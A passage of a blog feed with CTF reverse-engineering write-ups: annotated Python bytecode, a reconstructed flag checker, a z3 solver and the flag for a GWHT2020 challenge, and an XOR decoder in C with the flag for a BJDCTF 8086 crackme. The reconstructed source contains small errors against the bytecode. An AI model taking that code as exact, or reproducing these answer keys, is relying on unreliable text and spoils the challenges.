(38)</span><br><span class="line">            149 COMPARE_OP               0 (&lt;)</span><br><span class="line">            152 POP_JUMP_IF_FALSE      173</span><br><span class="line">if(a&lt;38)  </span><br><span class="line">    jump to 173</span><br><span class="line"></span><br><span class="line"> 14         155 LOAD_CONST              31 (&#39;lenth wrong!&#39;)</span><br><span class="line">            158 PRINT_ITEM          </span><br><span class="line">            159 PRINT_NEWLINE       </span><br><span class="line"></span><br><span class="line"> 15         160 LOAD_NAME                7 (exit)</span><br><span class="line">            163 LOAD_CONST              32 (0)</span><br><span class="line">            166 CALL_FUNCTION            1</span><br><span class="line">            169 POP_TOP             </span><br><span class="line">            170 JUMP_FORWARD             0 (to 173)</span><br><span class="line"></span><br><span class="line"> 17     &gt;&gt;  173 LOAD_NAME                8 (ord)</span><br><span class="line">            176 LOAD_NAME                4 (str)</span><br><span class="line">            179 LOAD_CONST              32 (0)</span><br><span class="line">            182 BINARY_SUBSCR       </span><br><span class="line">            183 CALL_FUNCTION            1</span><br><span class="line">            186 LOAD_CONST              33 (2020)</span><br><span class="line">            189 BINARY_MULTIPLY                         str[0]*2020</span><br><span class="line">            190 LOAD_NAME                8 (ord)</span><br><span class="line">            193 LOAD_NAME                4 (str)</span><br><span class="line">            196 LOAD_CONST              34 (1)</span><br><span class="line">            199 BINARY_SUBSCR       </span><br><span class="line">            200 CALL_FUNCTION            1</span><br><span class="line">            203 BINARY_ADD          </span><br><span class="line">            204 LOAD_CONST              33 (2020)</span><br><span class="line">            207 BINARY_MULTIPLY                         (str[0]*2020+str[1])*2020     </span><br><span class="line">            208 LOAD_NAME                8 (ord)</span><br><span class="line">            211 LOAD_NAME                4 (str)</span><br><span class="line">            214 LOAD_CONST              35 (2)</span><br><span class="line">            217 BINARY_SUBSCR       </span><br><span class="line">            218 CALL_FUNCTION            1</span><br><span class="line">            221 BINARY_ADD          </span><br><span class="line">            222 LOAD_CONST              33 (2020)</span><br><span class="line">            225 BINARY_MULTIPLY     </span><br><span class="line">            226 LOAD_NAME                8 (ord)</span><br><span class="line">            229 LOAD_NAME                4 (str)</span><br><span class="line">            232 LOAD_CONST               0 (3)</span><br><span class="line">            235 BINARY_SUBSCR       </span><br><span class="line">            236 CALL_FUNCTION            1</span><br><span class="line">            239 BINARY_ADD          </span><br><span class="line">            240 LOAD_CONST              33 (2020)</span><br><span class="line">            243 BINARY_MULTIPLY     </span><br><span class="line">            244 LOAD_NAME                8 (ord)</span><br><span class="line">            247 LOAD_NAME                4 (str)</span><br><span class="line">            250 LOAD_CONST              36 (4)</span><br><span class="line">            253 BINARY_SUBSCR       </span><br><span class="line">            254 CALL_FUNCTION            1</span><br><span class="line">            257 BINARY_ADD          </span><br><span class="line">            258 LOAD_CONST              37 (1182843538814603)</span><br><span class="line">            261 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            264 POP_JUMP_IF_FALSE      275</span><br><span class="line">if(((((str[0]*2020+str[1])*2020+str[2])*2020+str[3])*2020+str[4])!&#x3D;1182843538814603)</span><br><span class="line">    jump to 275</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> 18         267 LOAD_CONST              38 (&#39;good!continue\xe2\x80\xa6\xe2\x80\xa6&#39;)</span><br><span class="line">            270 PRINT_ITEM          </span><br><span class="line">            271 PRINT_NEWLINE       </span><br><span class="line">            272 JUMP_FORWARD            15 (to 290)</span><br><span class="line"></span><br><span class="line"> 20     &gt;&gt;  275 LOAD_CONST              39 (&#39;bye~&#39;)</span><br><span class="line">            278 PRINT_ITEM          </span><br><span class="line">            279 PRINT_NEWLINE       </span><br><span class="line"></span><br><span class="line"> 21         280 LOAD_NAME                7 (exit)</span><br><span class="line">            283 LOAD_CONST              32 (0)</span><br><span class="line">            286 CALL_FUNCTION            1</span><br><span class="line">            289 POP_TOP             </span><br><span class="line"></span><br><span class="line"> 23     &gt;&gt;  290 BUILD_LIST               0</span><br><span class="line">            293 STORE_NAME               9 (x)</span><br><span class="line"></span><br><span class="line"> 24         296 LOAD_CONST              40 (5)</span><br><span class="line">            299 STORE_NAME              10 (k)          k&#x3D;5</span><br><span class="line"></span><br><span class="line"> 25         302 SETUP_LOOP             128 (to 433)</span><br><span class="line">            305 LOAD_NAME               11 (range)</span><br><span class="line">            308 LOAD_CONST              41 (13)         range(13)</span><br><span class="line">            311 CALL_FUNCTION            1</span><br><span class="line">            314 GET_ITER            </span><br><span class="line">        &gt;&gt;  315 FOR_ITER               114 (to 432)</span><br><span class="line">            318 STORE_NAME              12 (i)</span><br><span class="line"></span><br><span class="line"> 26         321 LOAD_NAME                8 (ord)</span><br><span class="line">            324 LOAD_NAME                4 (str)</span><br><span class="line">            327 LOAD_NAME               10 (k)</span><br><span class="line">            330 BINARY_SUBSCR       </span><br><span class="line">            331 CALL_FUNCTION            1</span><br><span class="line">            334 STORE_NAME              13 (b)          b&#x3D;ord(str[k])</span><br><span class="line"></span><br><span class="line"> 27         337 LOAD_NAME                8 (ord)</span><br><span class="line">            340 LOAD_NAME                4 (str)</span><br><span class="line">            343 LOAD_NAME               10 (k)</span><br><span class="line">            346 LOAD_CONST              34 (1)</span><br><span class="line">            349 BINARY_ADD          </span><br><span class="line">            350 BINARY_SUBSCR       </span><br><span class="line">            351 CALL_FUNCTION            1</span><br><span class="line">            354 STORE_NAME              14 (c)          c&#x3D;ord(str[k+1])</span><br><span class="line"></span><br><span class="line"> 28         357 LOAD_NAME               14 (c)</span><br><span class="line">            360 LOAD_NAME                0 (en)</span><br><span class="line">            363 LOAD_NAME               12 (i)</span><br><span class="line">            366 LOAD_CONST               4 (6)</span><br><span class="line">            369 BINARY_MODULO                    </span><br><span class="line">            370 BINARY_SUBSCR       </span><br><span class="line">            371 BINARY_XOR                              </span><br><span class="line">            372 STORE_NAME              15 (a11)        a11&#x3D;c^en[i%6]</span><br><span class="line"></span><br><span class="line"> 29         375 LOAD_NAME               13 (b)</span><br><span class="line">            378 LOAD_NAME                0 (en)</span><br><span class="line">            381 LOAD_NAME               12 (i)</span><br><span class="line">            384 LOAD_CONST               4 (6)</span><br><span class="line">            387 BINARY_MODULO       </span><br><span class="line">            388 BINARY_SUBSCR       </span><br><span class="line">            389 BINARY_XOR          </span><br><span class="line">            390 STORE_NAME              16 (a22)        a22&#x3D;c^en[i%6]</span><br><span class="line"></span><br><span class="line"> 30         393 LOAD_NAME                9 (x)</span><br><span class="line">            396 LOAD_ATTR               17 (append)</span><br><span class="line">            399 LOAD_NAME               15 (a11)        x.append(a11)</span><br><span class="line">            402 CALL_FUNCTION            1</span><br><span class="line">            405 POP_TOP             </span><br><span class="line"></span><br><span class="line"> 31         406 LOAD_NAME                9 (x)</span><br><span class="line">            409 LOAD_ATTR               17 (append)</span><br><span class="line">            412 LOAD_NAME               16 (a22)        x.append(a22)</span><br><span class="line">            415 CALL_FUNCTION            1</span><br><span class="line">            418 POP_TOP             </span><br><span class="line"></span><br><span class="line"> 32         419 LOAD_NAME               10 (k)</span><br><span class="line">            422 LOAD_CONST              35 (2)</span><br><span class="line">            425 INPLACE_ADD                           </span><br><span class="line">            426 STORE_NAME              10 (k)          k+&#x3D;2</span><br><span class="line">            429 JUMP_ABSOLUTE          315</span><br><span class="line">        &gt;&gt;  432 POP_BLOCK           </span><br><span class="line"></span><br><span class="line"> 33     &gt;&gt;  433 LOAD_NAME                9 (x)</span><br><span class="line">            436 LOAD_NAME                1 (output)</span><br><span class="line">            439 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            442 POP_JUMP_IF_FALSE      453</span><br><span class="line">if(x!&#x3D;output)</span><br><span class="line">    jump to 453</span><br><span class="line"></span><br><span class="line"> 34         445 LOAD_CONST              38 (&#39;good!continue\xe2\x80\xa6\xe2\x80\xa6&#39;)</span><br><span class="line">            448 PRINT_ITEM          </span><br><span class="line">            449 PRINT_NEWLINE       </span><br><span class="line">            450 JUMP_FORWARD            15 (to 468)</span><br><span class="line"></span><br><span class="line"> 36     &gt;&gt;  453 LOAD_CONST              42 (&#39;oh,you are wrong!&#39;)</span><br><span class="line">            456 PRINT_ITEM          </span><br><span class="line">            457 PRINT_NEWLINE       </span><br><span class="line"></span><br><span class="line"> 37         458 LOAD_NAME                7 (exit)</span><br><span class="line">            461 LOAD_CONST              32 (0)</span><br><span class="line">            464 CALL_FUNCTION            1</span><br><span class="line">            467 POP_TOP             </span><br><span class="line"></span><br><span class="line"> 39     &gt;&gt;  468 LOAD_NAME                5 (len)</span><br><span class="line">            471 LOAD_NAME                4 (str)</span><br><span class="line">            474 CALL_FUNCTION            1</span><br><span class="line">            477 STORE_NAME              18 (l)          l&#x3D;len(str)</span><br><span class="line"></span><br><span class="line"> 40         480 LOAD_NAME                8 (ord)</span><br><span class="line">            483 LOAD_NAME                4 (str)</span><br><span class="line">            486 LOAD_NAME               18 (l)</span><br><span class="line">            489 LOAD_CONST              43 (7)</span><br><span class="line">            492 BINARY_SUBTRACT     </span><br><span class="line">            493 BINARY_SUBSCR                           </span><br><span class="line">            494 CALL_FUNCTION            1</span><br><span class="line">            497 STORE_NAME              19 (a1)         a1&#x3D;ord(str[l-7])</span><br><span class="line"></span><br><span class="line"> 41         500 LOAD_NAME                8 (ord)</span><br><span class="line">            503 LOAD_NAME                4 (str)</span><br><span class="line">            506 LOAD_NAME               18 (l)</span><br><span class="line">            509 LOAD_CONST               4 (6)</span><br><span class="line">            512 BINARY_SUBTRACT     </span><br><span class="line">            513 BINARY_SUBSCR       </span><br><span class="line">            514 CALL_FUNCTION            1</span><br><span class="line">            517 STORE_NAME              20 (a2)         a2&#x3D;ord(str[l-6])</span><br><span class="line"></span><br><span class="line"> 42         520 LOAD_NAME                8 (ord)</span><br><span class="line">            523 LOAD_NAME                4 (str)</span><br><span class="line">            526 LOAD_NAME               18 (l)</span><br><span class="line">            529 LOAD_CONST              40 (5)</span><br><span class="line">            532 BINARY_SUBTRACT     </span><br><span class="line">            533 BINARY_SUBSCR       </span><br><span class="line">            534 CALL_FUNCTION            1</span><br><span class="line">            537 STORE_NAME              21 (a3)</span><br><span class="line"></span><br><span class="line"> 43         540 LOAD_NAME                8 (ord)</span><br><span class="line">            543 LOAD_NAME                4 (str)</span><br><span class="line">            546 LOAD_NAME               18 (l)</span><br><span class="line">            549 LOAD_CONST              36 (4)</span><br><span class="line">            552 BINARY_SUBTRACT     </span><br><span class="line">            553 BINARY_SUBSCR       </span><br><span class="line">            554 CALL_FUNCTION            1</span><br><span class="line">            557 STORE_NAME              22 (a4)</span><br><span class="line"></span><br><span class="line"> 44         560 LOAD_NAME                8 (ord)</span><br><span class="line">            563 LOAD_NAME                4 (str)</span><br><span class="line">            566 LOAD_NAME               18 (l)</span><br><span class="line">            569 LOAD_CONST               0 (3)</span><br><span class="line">            572 BINARY_SUBTRACT     </span><br><span class="line">            573 BINARY_SUBSCR       </span><br><span class="line">            574 CALL_FUNCTION            1</span><br><span class="line">            577 STORE_NAME              23 (a5)</span><br><span class="line"></span><br><span class="line"> 45         580 LOAD_NAME                8 (ord)</span><br><span class="line">            583 LOAD_NAME                4 (str)</span><br><span class="line">            586 LOAD_NAME               18 (l)</span><br><span class="line">            589 LOAD_CONST              35 (2)</span><br><span class="line">            592 BINARY_SUBTRACT     </span><br><span class="line">            593 BINARY_SUBSCR       </span><br><span class="line">            594 CALL_FUNCTION            1</span><br><span class="line">            597 STORE_NAME              24 (a6)</span><br><span class="line"></span><br><span class="line"> 46         600 LOAD_NAME               19 (a1)</span><br><span class="line">            603 LOAD_CONST               0 (3)</span><br><span class="line">            606 BINARY_MULTIPLY     </span><br><span class="line">            607 LOAD_NAME               20 (a2)</span><br><span class="line">            610 LOAD_CONST              35 (2)</span><br><span class="line">            613 BINARY_MULTIPLY         </span><br><span class="line">            614 BINARY_ADD          </span><br><span class="line">            615 LOAD_NAME               21 (a3)</span><br><span class="line">            618 LOAD_CONST              40 (5)</span><br><span class="line">            621 BINARY_MULTIPLY     </span><br><span class="line">            622 BINARY_ADD          </span><br><span class="line">            623 LOAD_CONST              44 (1003)</span><br><span class="line">            626 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            629 POP_JUMP_IF_FALSE      807</span><br><span class="line">if((a[1]*3+a[2]*2+a[3]*5)!&#x3D;1003)</span><br><span class="line">    jump to 807</span><br><span class="line"></span><br><span class="line"> 47         632 LOAD_NAME               19 (a1)</span><br><span class="line">            635 LOAD_CONST              36 (4)</span><br><span class="line">            638 BINARY_MULTIPLY     </span><br><span class="line">            639 LOAD_NAME               20 (a2)</span><br><span class="line">            642 LOAD_CONST              43 (7)</span><br><span class="line">            645 BINARY_MULTIPLY     </span><br><span class="line">            646 BINARY_ADD          </span><br><span class="line">            647 LOAD_NAME               21 (a3)</span><br><span class="line">            650 LOAD_CONST               3 (9)</span><br><span class="line">            653 BINARY_MULTIPLY     </span><br><span class="line">            654 BINARY_ADD          </span><br><span class="line">            655 LOAD_CONST              45 (2013)</span><br><span class="line">            658 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            661 POP_JUMP_IF_FALSE      807</span><br><span class="line"></span><br><span class="line"> 48         664 LOAD_NAME               19 (a1)</span><br><span class="line">            667 LOAD_NAME               20 (a2)</span><br><span class="line">            670 LOAD_CONST              46 (8)</span><br><span class="line">            673 BINARY_MULTIPLY     </span><br><span class="line">            674 BINARY_ADD          </span><br><span class="line">            675 LOAD_NAME               21 (a3)</span><br><span class="line">            678 LOAD_CONST              35 (2)</span><br><span class="line">            681 BINARY_MULTIPLY     </span><br><span class="line">            682 BINARY_ADD          </span><br><span class="line">            683 LOAD_CONST              47 (1109)</span><br><span class="line">            686 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            689 POP_JUMP_IF_FALSE      804</span><br><span class="line"></span><br><span class="line"> 49         692 LOAD_NAME               22 (a4)</span><br><span class="line">            695 LOAD_CONST               0 (3)</span><br><span class="line">            698 BINARY_MULTIPLY     </span><br><span class="line">            699 LOAD_NAME               23 (a5)</span><br><span class="line">            702 LOAD_CONST              35 (2)</span><br><span class="line">            705 BINARY_MULTIPLY     </span><br><span class="line">            706 BINARY_ADD          </span><br><span class="line">            707 LOAD_NAME               24 (a6)</span><br><span class="line">            710 LOAD_CONST              40 (5)</span><br><span class="line">            713 BINARY_MULTIPLY     </span><br><span class="line">            714 BINARY_ADD          </span><br><span class="line">            715 LOAD_CONST              48 (671)</span><br><span class="line">            718 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            721 POP_JUMP_IF_FALSE      801</span><br><span class="line"></span><br><span class="line"> 50         724 LOAD_NAME               22 (a4)</span><br><span class="line">            727 LOAD_CONST              36 (4)</span><br><span class="line">            730 BINARY_MULTIPLY     </span><br><span class="line">            731 LOAD_NAME               23 (a5)</span><br><span class="line">            734 LOAD_CONST              43 (7)</span><br><span class="line">            737 BINARY_MULTIPLY     </span><br><span class="line">            738 BINARY_ADD          </span><br><span class="line">            739 LOAD_NAME               24 (a6)</span><br><span class="line">            742 LOAD_CONST               3 (9)</span><br><span class="line">            745 BINARY_MULTIPLY     </span><br><span class="line">            746 BINARY_ADD          </span><br><span class="line">            747 LOAD_CONST              49 (1252)</span><br><span class="line">            750 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            753 POP_JUMP_IF_FALSE      798</span><br><span class="line"></span><br><span class="line"> 51         756 LOAD_NAME               22 (a4)</span><br><span class="line">            759 LOAD_NAME               23 (a5)</span><br><span class="line">            762 LOAD_CONST              46 (8)</span><br><span class="line">            765 BINARY_MULTIPLY     </span><br><span class="line">            766 BINARY_ADD          </span><br><span class="line">            767 LOAD_NAME               24 (a6)</span><br><span class="line">            770 LOAD_CONST              35 (2)</span><br><span class="line">            773 BINARY_MULTIPLY     </span><br><span class="line">            774 BINARY_ADD          </span><br><span class="line">            775 LOAD_CONST              50 (644)</span><br><span class="line">            778 COMPARE_OP               2 (&#x3D;&#x3D;)</span><br><span class="line">            781 POP_JUMP_IF_FALSE      795</span><br><span class="line"></span><br><span class="line"> 52         784 LOAD_CONST              51 (&#39;congraduation!you get the right flag!&#39;)</span><br><span class="line">            787 PRINT_ITEM          </span><br><span class="line">            788 PRINT_NEWLINE       </span><br><span class="line">            789 JUMP_ABSOLUTE          795</span><br><span class="line">            792 JUMP_ABSOLUTE          798</span><br><span class="line">        &gt;&gt;  795 JUMP_ABSOLUTE          801</span><br><span class="line">        &gt;&gt;  798 JUMP_ABSOLUTE          804</span><br><span class="line">        &gt;&gt;  801 JUMP_ABSOLUTE          807</span><br><span class="line">        &gt;&gt;  804 JUMP_FORWARD             0 (to 807)</span><br><span class="line">        &gt;&gt;  807 LOAD_CONST              52 (None)</span><br><span class="line">            810 RETURN_VALUE </span><br></pre></td></tr></table></figure><blockquote><p>python源码</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">en=[<span class="number">3</span>,<span class="number">37</span>,<span class="number">72</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">132</span>]</span><br><span class="line">output=[<span class="number">101</span>, <span class="number">96</span>, <span class="number">23</span>, <span class="number">68</span>, <span class="number">112</span>, <span class="number">42</span>, <span class="number">107</span>, <span class="number">62</span>, <span class="number">96</span>, <span class="number">53</span>, <span class="number">176</span>, <span class="number">179</span>, <span class="number">98</span>, <span class="number">53</span>, <span class="number">67</span>, <span class="number">29</span>, <span class="number">41</span>, <span class="number">120</span>, <span class="number">60</span>, <span class="number">106</span>, <span class="number">51</span>, <span class="number">101</span>, <span class="number">178</span>, <span class="number">189</span>, <span class="number">101</span>, <span class="number">48</span>]</span><br><span class="line">print(<span class="string">&#x27;welcome to GWHT2020&#x27;</span>)</span><br><span class="line">flag=raw_input(<span class="string">&#x27;please input your flag:&#x27;</span>)</span><br><span class="line"><span class="built_in">str</span>=flag</span><br><span class="line">a=<span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="keyword">if</span> a&gt;=<span class="number">38</span>:</span><br><span class="line">peint(<span class="string">&#x27;lenth wrong!&#x27;</span>)</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span>((((<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">1</span>])+<span class="number">2020</span>*<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">0</span>]))*<span class="number">2020</span>+<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">2</span>]))*<span class="number">2020</span>+<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">3</span>]))*<span class="number">2020</span>+<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">4</span>])!=<span class="number">1182843538814603</span>):</span><br><span class="line">print(<span class="string">&#x27;bye~&#x27;</span>)</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line">print(<span class="string">&#x27;good!continue\xe2\x80\xa6\xe2\x80\xa6&#x27;</span>)</span><br><span class="line">k=<span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">b=<span class="built_in">ord</span>(<span class="built_in">str</span>[k])</span><br><span class="line">c=<span class="built_in">ord</span>(<span class="built_in">str</span>[k+<span class="number">1</span>])</span><br><span class="line">a11=c^en[i%<span class="number">6</span>]</span><br><span class="line">a22=c^en[i%<span class="number">6</span>]</span><br><span class="line">x.append(a11)</span><br><span class="line">x.append(a22)</span><br><span class="line">k+=<span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> x!=output:</span><br><span class="line">print(<span class="string">&#x27;oh,you are wrong!&#x27;</span>)</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line">l=<span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">a1=<span class="built_in">ord</span>(<span class="built_in">str</span>[l<span class="number">-7</span>])</span><br><span class="line">a2=<span class="built_in">ord</span>(<span class="built_in">str</span>[l<span class="number">-6</span>])</span><br><span class="line">a3=<span class="built_in">ord</span>(<span class="built_in">str</span>[l<span class="number">-5</span>])</span><br><span class="line">a4=<span class="built_in">ord</span>(<span class="built_in">str</span>[l<span class="number">-4</span>])</span><br><span class="line">a5=<span class="built_in">ord</span>(<span class="built_in">str</span>[l<span class="number">-3</span>])</span><br><span class="line">a6=<span class="built_in">ord</span>(<span class="built_in">str</span>[l<span class="number">-2</span>])</span><br><span class="line"><span class="keyword">if</span>((a1*<span class="number">3</span>+a2*<span class="number">2</span>+a3*<span class="number">5</span>==<span class="number">1003</span>)&amp;(a1*<span class="number">4</span>+a2*<span class="number">7</span>+a3*<span class="number">9</span>==<span class="number">2013</span>)&amp;(a1+a2*<span class="number">8</span>+a3*<span class="number">2</span>==<span class="number">1109</span>)&amp;(a4*<span class="number">3</span>+a5*<span class="number">2</span>+a6*<span class="number">5</span>==<span class="number">671</span>)&amp;(a4*<span class="number">4</span>+a5*<span class="number">7</span>+a6*<span class="number">9</span>==<span class="number">1252</span>)&amp;(a4+a5*<span class="number">8</span>+a6*<span class="number">2</span>==<span class="number">644</span>)):</span><br><span class="line">print(<span class="string">&#x27;congraduation!you get the right flag!&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>exp</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">en=[<span class="number">3</span>,<span class="number">37</span>,<span class="number">72</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">132</span>]</span><br><span class="line">output=[<span class="number">101</span>,<span class="number">96</span>,<span class="number">23</span>,<span class="number">68</span>,<span class="number">112</span>,<span class="number">42</span>,<span class="number">107</span>,<span class="number">62</span>,<span class="number">96</span>,<span class="number">53</span>,<span class="number">176</span>,<span class="number">179</span>,<span class="number">98</span>,<span class="number">53</span>,<span class="number">67</span>,<span class="number">29</span>,<span class="number">41</span>,<span class="number">120</span>,<span class="number">60</span>,<span class="number">106</span>,<span class="number">51</span>,<span class="number">101</span>,<span class="number">178</span>,<span class="number">189</span>,<span class="number">101</span>,<span class="number">48</span>]</span><br><span class="line">x = Solver()</span><br><span class="line">a1,a2,a3,a4,a5=Ints(<span class="string">&quot;a1 a2 a3 a4 a5&quot;</span>)</span><br><span class="line">x.add((((a1*<span class="number">2020</span>+a2)*<span class="number">2020</span>+a3)*<span class="number">2020</span>+a4)*<span class="number">2020</span>+a5==<span class="number">1182843538814603</span>)</span><br><span class="line">x.add(a1&gt;<span class="number">31</span>,a2&gt;<span class="number">31</span>,a3&gt;<span class="number">31</span>,a4&gt;<span class="number">31</span>,a5&gt;<span class="number">31</span>)</span><br><span class="line">x.add(a1&lt;<span class="number">127</span>,a2&lt;<span class="number">127</span>,a3&lt;<span class="number">127</span>,a4&lt;<span class="number">127</span>,a5&lt;<span class="number">127</span>)</span><br><span class="line"><span class="keyword">if</span> x.check()==sat:</span><br><span class="line">    print(x.model())</span><br><span class="line">a=[<span class="number">71</span>,<span class="number">87</span>,<span class="number">72</span>,<span class="number">84</span>,<span class="number">123</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">print(flag)</span><br><span class="line">b=[]</span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    b.append(output[k+<span class="number">1</span>]^en[i%<span class="number">6</span>])</span><br><span class="line">    b.append(output[k]^en[i%<span class="number">6</span>])</span><br><span class="line">    k+=<span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">print(flag)</span><br><span class="line">xx = Solver()</span><br><span class="line">a1,a2,a3,a4,a5,a6=Ints(<span class="string">&quot;a1 a2 a3 a4 a5 a6&quot;</span>)</span><br><span class="line">xx.add(a1*<span class="number">3</span>+a2*<span class="number">2</span>+a3*<span class="number">5</span>==<span class="number">1003</span>)</span><br><span class="line">xx.add(a1*<span class="number">4</span>+a2*<span class="number">7</span>+a3*<span class="number">9</span>==<span class="number">2013</span>)</span><br><span class="line">xx.add(a1+a2*<span class="number">8</span>+a3*<span class="number">2</span>==<span class="number">1109</span>)</span><br><span class="line">xx.add(a4*<span class="number">3</span>+a5*<span class="number">2</span>+a6*<span class="number">5</span>==<span class="number">671</span>)</span><br><span class="line">xx.add(a4*<span class="number">4</span>+a5*<span class="number">7</span>+a6*<span class="number">9</span>==<span class="number">1252</span>)</span><br><span class="line">xx.add(a4+a5*<span class="number">8</span>+a6*<span class="number">2</span>==<span class="number">644</span>)</span><br><span class="line"><span class="keyword">if</span> xx.check()==sat:</span><br><span class="line">    print(xx.model())</span><br><span class="line">c=[<span class="number">97</span>,<span class="number">101</span>,<span class="number">102</span>,<span class="number">102</span>,<span class="number">55</span>,<span class="number">51</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(i)</span><br><span class="line">flag+=<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><blockquote><p>flag{cfa2b87b3f746a8f0ac5c5963faeff73}</p></blockquote><h1 id="BJDCTF-2nd-8086"><a href="#BJDCTF-2nd-8086" class="headerlink" title="[BJDCTF 2nd]8086"></a>[BJDCTF 2nd]8086</h1><p><a href="https://buuoj.cn/challenges#[BJDCTF%202nd]8086">题目链接</a><br>拖入64位ida中</p><p><img src="/2021/04/16/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/1.PNG"></p><p>只有一串字符、一个死循环和一堆数据。<br>将里面的数据强制转换为代码</p><p><img src="/2021/04/16/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/2.PNG"></p><p>是一个异或</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[]=<span class="string">&quot;]U[du~|t@&#123;z@wj.&#125;.~q@gjz&#123;z@wzqW~/b;&quot;</span>; </span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">0x22</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i]^=<span class="number">0x1f</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{jack_de_hu1b1an_xuede_henHa0}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ida无法f5解决方案</title>
      <link href="/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>/2021/04/11/ida%E6%97%A0%E6%B3%95f5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
